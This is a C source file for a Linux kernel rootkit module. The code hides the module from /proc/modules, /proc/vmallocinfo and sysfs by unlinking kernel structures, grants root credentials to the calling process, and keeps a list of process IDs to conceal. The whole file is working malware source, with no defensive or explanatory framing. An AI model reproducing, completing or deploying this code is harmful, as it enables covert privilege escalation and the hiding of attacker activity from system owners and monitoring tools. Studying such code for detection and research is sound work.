#include "utils.h"

#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include <asm/current.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/rbtree.h>
#include <linux/slab.h>
#include <linux/sysfs.h>
#include <linux/types.h>
#include <linux/vmalloc.h>

LIST_HEAD(hidden_pids_list);

void hide_module(void)
{
    struct vmap_area *vma;
    struct vmap_area *vma_tmp;
    struct module_use *use;
    struct module_use *use_tmp;
    struct list_head *vma_list;
    struct rb_root *vma_root;

    vma_list = (struct list_head *)lookup_name("vmap_area_list");
    vma_root = (struct rb_root *)lookup_name("vmap_area_root");

    pr_info("[ROOTKIT] vma_list: %p\n", vma_list);
    pr_info("[ROOTKIT] vma_root: %p\n", vma_root);

    // Remove module from /proc/vmallocinfo
    list_for_each_entry_safe (vma, vma_tmp, vma_list, list) {
        if ((unsigned long)THIS_MODULE > vma->va_start &&
            (unsigned long)THIS_MODULE < vma->va_end) {
            pr_info("[ROOTKIT] * Removing vma %p...", vma);
            list_del(&vma->list);
            rb_erase(&vma->rb_node, vma_root);
            pr_cont(" done\n");
        }
    }

    // Remove module from /proc/modules
    list_del(&THIS_MODULE->list);

    // Remove module from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);

    // Clear dependency list (see kernel/module.c)
    list_for_each_entry_safe (use, use_tmp, &THIS_MODULE->target_list, target_list) {
        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", use->source->name,
                use->target->name);
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        kfree(use);
        pr_cont(" done\n");
    }

    pr_info("[ROOTKIT] Module was hidden\n");
}

void show_all_processes(void)
{
    hidden_pid_t *p_hidden_pid = NULL; // Hidden PID structure
    hidden_pid_t *p_tmp        = NULL; // Temporary pointer for iteration

    pr_info("[ROOTKIT] Unhiding all processes...\n");

    // Remove all PIDs from the hidden list
    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
        list_del(&p_hidden_pid->list);
        kfree(p_hidden_pid);
    }
}

bool is_pid_hidden(const pid_t i32_pid)
{
    const hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
    const pid_t i32_real_pid         = get_effective_pid(i32_pid); // Effective PID to check

    if (i32_real_pid == -1) {
        return false;
    }

    // Check if the given PID is in the hidden list
    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
                p_hidden_pid->i32_pid, i32_real_pid);
        if (p_hidden_pid->i32_pid == i32_real_pid) {
            pr_cont(" found!\n");
            return true;
        }
        else {
            pr_cont(" not found\n");
        }
    }

    return false;
}

long give_root(const pid_t i32_pid, const int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_err("[ROOTKIT] * Failed to get credentials\n");
        return -EPERM;
    }

    __SET_UIDS(p_creds, ROOT_UID);
    __SET_GIDS(p_creds, ROOT_GID);

    commit_creds(p_creds);

    pr_info("[ROOTKIT] * Process is now root\n");

    return 0;
}

long show_hide_process(const pid_t i32_pid, const int i32_sig)
{
    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
    hidden_pid_t *p_tmp        = NULL;                       // Temporary pointer for iteration
    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    switch (i32_sig) {
    case SIGHIDE:
        pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);

        p_hidden_pid = kzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
        IF_U (p_hidden_pid == NULL) {
            pr_err("[ROOTKIT]   * Failed to allocate memory for hidden PID structure\n");
            return -EPERM;
        }

        // Add the given PID to the list (if it is 0, add the current PID)
        p_hidden_pid->i32_pid = i32_real_pid;

        list_add(&p_hidden_pid->list, &hidden_pids_list);
        break;

    case SIGSHOW:
        pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);

        // Remove the given PID from the hidden list (if it is 0, remove the current PID)
        list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
            if (p_hidden_pid->i32_pid == i32_real_pid) {
                list_del(&p_hidden_pid->list);
                kfree(p_hidden_pid);
            }
        }
        break;

    default:
        pr_err("[ROOTKIT] * show_hide_process(): Invalid signal: %d\n", i32_sig);
        return -EINVAL;
    }

    return 0;
}
